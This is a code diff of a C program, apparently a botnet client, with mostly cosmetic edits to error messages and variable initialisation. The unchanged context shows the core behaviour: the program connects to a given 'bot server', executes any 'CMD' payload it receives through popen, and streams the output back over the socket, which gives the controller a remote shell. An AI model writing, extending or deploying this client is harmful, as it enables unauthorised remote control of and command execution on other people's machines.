@@ -58,7 +58,7 @@ void run_icd(char *address, int port) {
     FILE *fp;
 
     /* validate port number */
-    if (port < 1 || port > 65535) error("invalid port.");
+    if (port < 1 || port > 65535) error("invalid port");
 
     /* connect to the provided address and port, the bot server */
     conn_sockfd = get_conn_sock(address, port);
@@ -68,7 +68,7 @@ void run_icd(char *address, int port) {
         /* read an incoming message from the bot server */
         memset(&buf, 0, sizeof(buf));
         err = read(conn_sockfd, buf, MAX_BUF);
-        if (err == -1) error("read failed.");
+        if (err == -1) error("read failed");
         /* lost connection with server */
         else if (err == 0) break;
 
@@ -79,25 +79,25 @@ void run_icd(char *address, int port) {
         if (strcmp(cmd, "CMD") == 0) {
             /* execute the command and open a pipe to the output */
             fp = popen(args, "r");
-            if (fp == NULL) error("popen failed.");
+            if (fp == NULL) error("popen failed");
 
             /* read in the command's output */
             while (fgets(buf, MAX_BUF, fp) != NULL) {
                 /* send each line of output back as a MSG string for the user */
                 snprintf(msg, MAX_BUF, "MSG %s", buf);
                 err = write(conn_sockfd, msg, strlen(msg)); 
-                if (err == -1) error("write failed.");
+                if (err == -1) error("write failed");
             }
 
             status = pclose(fp);
-            if (status == -1) error("pclose failed.");
+            if (status == -1) error("pclose failed");
         }       
     }
 }
 
 int main(int argc, char **argv) {
     int next_arg;
-    char *port, *address;
+    char *port = NULL, *address = NULL;
     extern char *optarg;
     extern int optind;
     
@@ -106,9 +106,7 @@ int main(int argc, char **argv) {
         int option_index = 0;
 
         /* parse the next argument based on specified possible arguments */
-        next_arg = getopt_long_only(argc, argv, "p:a:hv", long_options, &option_index);
-
-        /* done parsing arguments, move on */
+        next_arg = getopt_long_only(argc, argv, "p:a:hv", long_options, &option_index); /* done parsing arguments, move on */
         if (next_arg == -1) break;
 
         switch(next_arg) {
